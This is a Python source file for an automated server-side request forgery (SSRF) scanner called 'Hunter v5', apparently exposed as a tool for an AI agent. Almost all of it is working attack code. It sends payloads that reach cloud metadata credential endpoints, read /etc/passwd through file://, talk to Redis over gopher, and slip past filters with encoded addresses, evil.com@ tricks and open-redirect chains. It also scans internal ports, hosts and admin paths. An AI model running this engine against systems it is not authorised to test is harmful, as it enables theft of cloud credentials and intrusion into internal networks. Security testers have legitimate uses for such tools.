"""
Hunter v5 — Auto SSRF Engine (Enhanced)

Automates SSRF detection and exploitation:
1. Parameter discovery
2. Internal IP probing
3. Cloud metadata access
4. Protocol smuggling (gopher://, file://)
5. DNS rebinding detection
6. POST body URL parameter support
7. Authenticated session support
8. Internal port/path enumeration
9. Open redirect chain bypass
"""

import re
import time
import concurrent.futures
from typing import Optional

try:
    from tools.probe import _get_session
except (ImportError, ModuleNotFoundError):
    import requests
    def _get_session():
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        return s


class AutoSSRF:
    """Automated SSRF detection and exploitation engine."""

    def __init__(self, base_url: str, param: str = "url",
                 method: str = "GET", session=None,
                 headers: dict = None, body_template: str = ""):
        self.base_url = base_url
        self.param = param
        self.method = method.upper()
        self.session = session or _get_session()
        self.extra_headers = headers or {}
        self.body_template = body_template
        self.vulnerable = False
        self.internal_access = False
        self.cloud_metadata = False
        self.findings = []
        self.baseline_response = None
        self.evidence = None

    def _request_record(self, payload: str) -> dict:
        if self.method == "GET":
            from urllib.parse import quote
            return {"method": "GET", "url": f"{self.base_url}?{self.param}={quote(payload)}", "headers": dict(getattr(self, "extra_headers", {})), "body": ""}
        return {"method": self.method, "url": self.base_url, "headers": dict(getattr(self, "extra_headers", {})), "body": {self.param: payload}}

    def _build_evidence(self, payload: str, response: dict, reproduction_count: int) -> dict:
        baseline = self.baseline_response or {}
        metadata = {
            "response_time": response.get("time", 0),
            "baseline_response_time": baseline.get("time", 0),
        }
        return {
            "request": self._request_record(payload),
            "response": {"status_code": response.get("status", 0), "headers": response.get("headers", {}), "body": response.get("body", "")},
            "baseline_response": {"status_code": baseline.get("status", 0), "headers": baseline.get("headers", {}), "body": baseline.get("body", "")},
            "payload": payload,
            "reproduction_count": reproduction_count,
            "metadata": metadata,
        }

    def _ensure_baseline(self) -> dict:
        if self.baseline_response is None:
            self.baseline_response = self._test_payload("http://example.com")
        return self.baseline_response

    def _confirm_evidence(self, payload: str, first_response: dict) -> dict:
        from core.evidence.verdict_engine import Verdict, VerdictEngine, VulnType

        responses = [first_response]
        responses.extend(self._test_payload(payload) for _ in range(2))
        confirmed = 0
        for response in responses:
            item = self._build_evidence(payload, response, 1)
            if VerdictEngine().assess(VulnType.SSRF, item).verdict in {Verdict.LIKELY, Verdict.VERIFIED}:
                confirmed += 1
        evidence = self._build_evidence(payload, first_response, confirmed)
        self.evidence = evidence
        return evidence

    def _test_payload(self, payload: str) -> dict:
        """Send SSRF payload and analyze response."""
        try:
            if self.method == "GET":
                from urllib.parse import quote
                url = f"{self.base_url}?{self.param}={quote(payload)}"
                resp = self.session.get(url, headers=self.extra_headers,
                                        timeout=10, allow_redirects=False)
            else:
                # POST with form data
                if self.body_template:
                    body = self.body_template.replace("{payload}", payload)
                else:
                    body = f"{self.param}={payload}"
                resp = self.session.post(self.base_url, data=body,
                                         headers=self.extra_headers,
                                         timeout=10, allow_redirects=False)

            return {
                "status": resp.status_code,
                "body": resp.text[:2000],
                "length": len(resp.text),
                "headers": dict(resp.headers),
            }
        except Exception as e:
            return {"status": 0, "error": str(e)}

    def test_internal_access(self) -> dict:
        """Test if target can access internal IPs."""
        internal_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://0177.0.0.1",
            "http://0x7f000001",
            "http://2130706433",
        ]

        # Get baseline response length
        baseline = self._test_payload("http://example.com")
        baseline_len = len(baseline.get("body", ""))

        results = []
        for payload in internal_payloads:
            result = self._test_payload(payload)
            body_len = len(result.get("body", ""))
            # Check if we got a different response (status OR length)
            status_ok = result.get("status") == 200
            length_different = abs(body_len - baseline_len) > 50
            if (status_ok and body_len > 100) or length_different:
                self.internal_access = True
                self.vulnerable = True
                self.findings.append({
                    "type": "internal_access",
                    "payload": payload,
                    "status": result["status"],
                    "body_length": body_len,
                    "baseline_length": baseline_len,
                })
                results.append({"payload": payload, "status": result["status"], "vulnerable": True, "body_len": body_len})
            else:
                results.append({"payload": payload, "status": result.get("status"), "vulnerable": False, "body_len": body_len})

        return {"tested": len(results), "vulnerable": self.internal_access, "results": results}

    def test_cloud_metadata(self) -> dict:
        """Test access to cloud metadata endpoints."""
        metadata_payloads = {
            "aws": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ],
            "gcp": [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            ],
            "azure": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            ],
        }

        results = []
        for cloud, payloads in metadata_payloads.items():
            for payload in payloads:
                result = self._test_payload(payload)
                if result.get("status") == 200 and len(result.get("body", "")) > 50:
                    self.cloud_metadata = True
                    self.vulnerable = True
                    self.findings.append({
                        "type": "cloud_metadata",
                        "cloud": cloud,
                        "payload": payload,
                        "status": result["status"],
                    })
                    results.append({"cloud": cloud, "payload": payload, "status": result["status"], "vulnerable": True})

        return {"tested": len(results), "vulnerable": self.cloud_metadata, "results": results}

    def test_internal_services(self) -> dict:
        """Test access to common internal services."""
        service_payloads = [
            ("redis", "http://127.0.0.1:6379"),
            ("elasticsearch", "http://127.0.0.1:9200"),
            ("memcached", "http://127.0.0.1:11211"),
            ("mysql", "http://127.0.0.1:3306"),
            ("postgresql", "http://127.0.0.1:5432"),
            ("mongodb", "http://127.0.0.1:27017"),
            ("docker_api", "http://127.0.0.1:2375"),
            ("consul", "http://127.0.0.1:8500"),
        ]

        results = []
        for service, payload in service_payloads:
            result = self._test_payload(payload)
            if result.get("status") == 200:
                self.findings.append({
                    "type": "internal_service",
                    "service": service,
                    "payload": payload,
                })
                results.append({"service": service, "payload": payload, "status": result["status"]})

        return {"tested": len(service_payloads), "accessible": len(results), "results": results}

    def test_protocol_smuggling(self) -> dict:
        """Test protocol-based SSRF (gopher://, file://)."""
        protocol_payloads = [
            ("file", "file:///etc/passwd"),
            ("file_win", "file:///c:/windows/win.ini"),
            ("gopher", "gopher://127.0.0.1:6379/_INFO"),
            ("dict", "dict://127.0.0.1:6379/info"),
        ]

        results = []
        for proto, payload in protocol_payloads:
            result = self._test_payload(payload)
            if result.get("status") == 200 and len(result.get("body", "")) > 50:
                self.findings.append({
                    "type": "protocol_smuggling",
                    "protocol": proto,
                    "payload": payload,
                })
                results.append({"protocol": proto, "payload": payload, "status": result["status"], "vulnerable": True})

        return {"tested": len(protocol_payloads), "vulnerable": len(results) > 0, "results": results}

    def test_bypass(self) -> dict:
        """Test SSRF filter bypass techniques."""
        bypass_payloads = [
            # IP format bypass
            ("short_form", "http://127.1"),
            ("decimal_ip", "http://2130706433"),
            ("hex_ip", "http://0x7f000001"),
            ("octal_ip", "http://0177.0.0.1"),
            ("nip_io", "http://127.0.0.1.nip.io"),
            ("sslip_io", "http://127.0.0.1.sslip.io"),
            ("ipv6", "http://[::1]"),
            # URL encoding bypass
            ("double_encode_a", "http://127.1/%2561dmin"),
            ("double_encode_d", "http://127.1/%2564dmin"),
            ("single_encode_a", "http://127.1/%61dmin"),
            # URL tricks
            ("redirect", "http://httpbin.org/redirect-to?url=http://127.0.0.1"),
            ("url_fragment", "http://127.0.0.1#@evil.com"),
            ("url_at", "http://evil.com@127.0.0.1"),
            ("url_double_encode", "http://127.0.0.1%252f"),
            ("enclosed_alphanum", "http://①②⑦.⓪.⓪.①"),
        ]

        results = []
        for name, payload in bypass_payloads:
            result = self._test_payload(payload)
            if result.get("status") == 200:
                results.append({"technique": name, "payload": payload, "status": result["status"]})
                self.findings.append({
                    "type": "ssrf_bypass",
                    "technique": name,
                    "payload": payload,
                })

        return {"tested": len(bypass_payloads), "bypasses_found": len(results), "results": results}

    def test_open_redirect_chain(self, redirect_endpoint: str, internal_target: str = "http://192.168.0.12:8080/admin") -> dict:
        """Test SSRF via open redirect chain.

        Args:
            redirect_endpoint: Open redirect URL (e.g., /product/nextProduct?path=)
            internal_target: Internal URL to reach via redirect

        This bypasses host-based SSRF filters because the initial request
        goes to the app's own domain, then follows the redirect to internal.
        """
        # Build the chain: stockApi → open redirect → internal target
        from urllib.parse import quote
        chain_payload = f"{redirect_endpoint}{quote(internal_target, safe='')}"

        result = self._test_payload(chain_payload)
        if result.get("status") == 200 and len(result.get("body", "")) > 100:
            self.vulnerable = True
            self.findings.append({
                "type": "ssrf_redirect_chain",
                "redirect_endpoint": redirect_endpoint,
                "internal_target": internal_target,
                "chain_payload": chain_payload,
            })
            return {
                "vulnerable": True,
                "technique": "open_redirect_chain",
                "payload": chain_payload,
                "note": "Server follows redirect to internal target, bypassing host filter",
            }

        return {"vulnerable": False, "technique": "open_redirect_chain"}

    def test_internal_port_scan(self, ports: list = None) -> dict:
        """Scan common internal ports via SSRF."""
        if ports is None:
            ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 8888, 9090, 9200, 6379, 27017, 3306, 5432]

        baseline = self._test_payload("http://127.0.0.1:1")
        baseline_len = len(baseline.get("body", ""))

        found = []
        results = []

        for port in ports:
            payload = f"http://127.0.0.1:{port}"
            result = self._test_payload(payload)
            body_len = len(result.get("body", ""))
            status = result.get("status", 0)

            is_open = status in (200, 301, 302, 403) or abs(body_len - baseline_len) > 50
            results.append({"port": port, "status": status, "body_length": body_len, "likely_open": is_open})

            if is_open:
                found.append({"port": port, "status": status})
                self.findings.append({
                    "type": "internal_port",
                    "port": port,
                    "status": status,
                })

        return {"tested": len(ports), "open": len(found), "results": results}

    def test_internal_path_enum(self, base_ip: str = "192.168.0.1",
                                 ports: list = None) -> dict:
        """Enumerate paths on internal hosts via SSRF."""
        if ports is None:
            ports = [80, 8080]

        admin_paths = [
            "/admin", "/admin/", "/login", "/manage", "/dashboard",
            "/api", "/api/v1", "/internal", "/debug", "/console",
            "/swagger", "/swagger-ui.html", "/api-docs",
            "/.env", "/config", "/status", "/health",
        ]

        found = []
        for port in ports:
            for path in admin_paths:
                payload = f"http://{base_ip}:{port}{path}"
                result = self._test_payload(payload)
                status = result.get("status", 0)
                body_len = len(result.get("body", ""))

                if status in (200, 301, 302, 403) and body_len > 100:
                    found.append({
                        "url": payload,
                        "status": status,
                        "body_length": body_len,
                    })
                    self.findings.append({
                        "type": "internal_path",
                        "url": payload,
                        "status": status,
                    })

        return {"tested": len(ports) * len(admin_paths), "found": len(found), "results": found}

    def test_internal_network_scan(self, base_ip: str = "192.168.0",
                                    ports: list = None,
                                    max_hosts: int = 20) -> dict:
        """Scan internal network for admin panels and services."""
        if ports is None:
            ports = [80, 8080]

        baseline = self._test_payload(f"http://{base_ip}.1:80")
        baseline_len = len(baseline.get("body", ""))

        found_services = []
        scanned = 0

        for i in range(1, 255):
            if scanned >= max_hosts:
                break

            for port in ports:
                if scanned >= max_hosts:
                    break

                payload = f"http://{base_ip}.{i}:{port}"
                result = self._test_payload(payload)
                body_len = len(result.get("body", ""))

                status_ok = result.get("status") in (200, 301, 302, 403)
                length_different = abs(body_len - baseline_len) > 50

                if status_ok or length_different:
                    found_services.append({
                        "ip": f"{base_ip}.{i}",
                        "port": port,
                        "status": result.get("status"),
                        "body_length": body_len,
                        "payload": payload,
                    })
                    self.findings.append({
                        "type": "internal_network",
                        "payload": payload,
                        "status": result.get("status"),
                    })

                scanned += 1

        return {
            "scanned": scanned,
            "found": len(found_services),
            "services": found_services,
        }

    def run_full_scan(self, internal_base_ip: str = "192.168.0") -> dict:
        """Run complete SSRF scan with internal network discovery."""
        start = time.time()
        results = {
            "target": self.base_url,
            "param": self.param,
            "method": self.method,
            "steps": [],
        }
        self._ensure_baseline()

        # Step 1: Internal access
        internal = self.test_internal_access()
        results["internal_access"] = internal
        results["steps"].append({"step": "internal_access", "result": internal})

        # Step 2: Cloud metadata
        cloud = self.test_cloud_metadata()
        results["cloud_metadata"] = cloud
        results["steps"].append({"step": "cloud_metadata", "result": cloud})

        # Step 3: Internal services
        services = self.test_internal_services()
        results["internal_services"] = services
        results["steps"].append({"step": "internal_services", "result": services})

        # Step 4: Protocol smuggling
        protocols = self.test_protocol_smuggling()
        results["protocol_smuggling"] = protocols
        results["steps"].append({"step": "protocol_smuggling", "result": protocols})

        # Step 5: Bypass techniques
        bypass = self.test_bypass()
        results["bypass"] = bypass
        results["steps"].append({"step": "bypass", "result": bypass})

        # Step 6: Internal port scan (if internal access confirmed)
        if self.internal_access:
            port_scan = self.test_internal_port_scan()
            results["internal_port_scan"] = port_scan
            results["steps"].append({"step": "internal_port_scan", "result": port_scan})

            # Step 7: Internal path enumeration
            path_enum = self.test_internal_path_enum()
            results["internal_path_enum"] = path_enum
            results["steps"].append({"step": "internal_path_enum", "result": path_enum})

            # Step 8: Internal network scan
            network = self.test_internal_network_scan(base_ip=internal_base_ip)
            results["internal_network"] = network
            results["steps"].append({"step": "internal_network", "result": network})

        from core.evidence.verdict_engine import Verdict, VerdictEngine, VulnType
        for finding in self.findings:
            candidate = finding.get("payload")
            if not candidate:
                continue
            first_response = self._test_payload(candidate)
            item = self._build_evidence(candidate, first_response, 1)
            if VerdictEngine().assess(VulnType.SSRF, item).verdict is Verdict.LIKELY:
                results["evidence"] = self._confirm_evidence(candidate, first_response)
                break

        results["vulnerable"] = self.vulnerable
        results["internal_access"] = self.internal_access
        results["cloud_metadata"] = self.cloud_metadata
        results["findings_count"] = len(self.findings)
        results["findings"] = self.findings
        results["elapsed_ms"] = int((time.time() - start) * 1000)

        return results


def auto_ssrf_impl(base_url: str, param: str = "url", method: str = "GET",
                    headers: dict = None, body_template: str = "",
                    internal_base_ip: str = "192.168.0") -> dict:
    """Run automated SSRF scan. Entry point for MCP tool."""
    engine = AutoSSRF(base_url, param, method, headers=headers,
                      body_template=body_template)
    return engine.run_full_scan(internal_base_ip=internal_base_ip)
